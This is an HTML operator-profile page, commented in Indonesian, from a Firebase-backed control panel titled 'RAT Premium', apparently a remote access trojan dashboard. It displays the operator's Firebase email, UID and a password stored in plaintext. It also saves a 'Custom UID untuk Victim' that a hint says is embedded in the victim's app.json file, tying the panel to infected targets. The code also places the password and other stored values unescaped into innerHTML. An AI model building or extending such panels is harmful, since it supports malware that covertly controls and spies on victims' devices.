<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Profile - RAT Premium</title>
    <link rel="stylesheet" href="css/style.css">
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
</head>
<body>
    <div class="profile-container">
        <div class="profile-card">
            <div class="profile-header">
                <h1>👤 Profile Information</h1>
                <a href="dashboard.html" class="btn-back">← Back to Dashboard</a>
            </div>
            
            <div class="profile-content">
                <div class="info-group">
                    <label>Email Firebase:</label>
                    <div class="info-value" id="profileEmail">
                        <span>loading...</span>
                        <button class="btn-copy" onclick="copyToClipboard('profileEmail')">📋 Copy</button>
                    </div>
                </div>
                
                <div class="info-group">
                    <label>UID Firebase:</label>
                    <div class="info-value" id="profileUid">
                        <span>loading...</span>
                        <button class="btn-copy" onclick="copyToClipboard('profileUid')">📋 Copy</button>
                    </div>
                </div>
                
                <div class="info-group">
                    <label>Password:</label>
                    <div class="info-value" id="profilePassword">
                        <span>••••••••</span>
                        <button class="btn-copy" onclick="copyPassword()">📋 Copy</button>
                    </div>
                </div>
                
                <div class="info-group">
                    <label>Custom UID untuk Victim:</label>
                    <div class="info-value">
                        <input type="text" id="customUid" placeholder="Masukkan UID Firebase lo" value="">
                        <button class="btn-save" onclick="saveCustomUid()">💾 Save</button>
                    </div>
                    <p class="hint">UID ini yang akan dimasukkan ke file app.json victim</p>
                </div>
                
                <div class="warning-box">
                    ⚠️ Jangan bagikan UID dan password ke siapapun!
                </div>
            </div>
        </div>
    </div>
    
    <script src="js/firebase-config.js"></script>
    <script>
        // Firebase Auth state
        firebase.auth().onAuthStateChanged(async (user) => {
            if (!user) {
                window.location.href = 'index.html';
                return;
            }
            
            // Tampilkan email
            document.getElementById('profileEmail').innerHTML = `
                <span>${user.email}</span>
                <button class="btn-copy" onclick="copyText('${user.email}')">📋 Copy</button>
            `;
            
            // Tampilkan UID
            document.getElementById('profileUid').innerHTML = `
                <span>${user.uid}</span>
                <button class="btn-copy" onclick="copyText('${user.uid}')">📋 Copy</button>
            `;
            
            // Ambil password dari database (kalau disimpan)
            const snapshot = await firebase.database().ref(`users/${user.uid}/password`).once('value');
            const password = snapshot.val() || '••••••••';
            
            if (password !== '••••••••') {
                document.getElementById('profilePassword').innerHTML = `
                    <span>${password}</span>
                    <button class="btn-copy" onclick="copyText('${password}')">📋 Copy</button>
                `;
            }
            
            // Cek custom UID dari localStorage atau database
            const customUid = localStorage.getItem('customUid') || user.uid;
            document.getElementById('customUid').value = customUid;
        });
        
        function copyText(text) {
            navigator.clipboard.writeText(text);
            alert('✅ Copied!');
        }
        
        function copyToClipboard(elementId) {
            const element = document.getElementById(elementId);
            const text = element.querySelector('span').innerText;
            navigator.clipboard.writeText(text);
            alert('✅ Copied!');
        }
        
        function copyPassword() {
            const passwordSpan = document.querySelector('#profilePassword span');
            if (passwordSpan.innerText !== '••••••••') {
                navigator.clipboard.writeText(passwordSpan.innerText);
                alert('✅ Password copied!');
            } else {
                alert('❌ Password hidden');
            }
        }
        
        function saveCustomUid() {
            const customUid = document.getElementById('customUid').value;
            localStorage.setItem('customUid', customUid);
            alert('✅ Custom UID saved!');
        }
    </script>
</body>
</html>
